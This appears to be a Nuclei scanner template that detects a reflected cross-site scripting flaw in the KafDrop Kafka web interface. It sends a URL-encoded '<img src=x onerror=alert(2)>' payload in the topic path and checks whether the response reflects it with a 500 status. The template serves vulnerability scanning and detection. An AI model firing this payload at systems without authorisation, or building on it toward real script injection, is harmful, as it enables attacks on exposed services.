id: kafdrop-xss

info:
  name: KafDrop XSS
  author: dhiyaneshDk
  severity: high
  tags: kafdrop,xss
  reference: https://github.com/obsidiandynamics/kafdrop

requests:
  - method: GET
    path:
      - "{{BaseURL}}/topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E"
    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'Kafdrop'
          - '<img src=x onerror=alert(2)>'
        part: body

      - type: status
        status:
          - 500
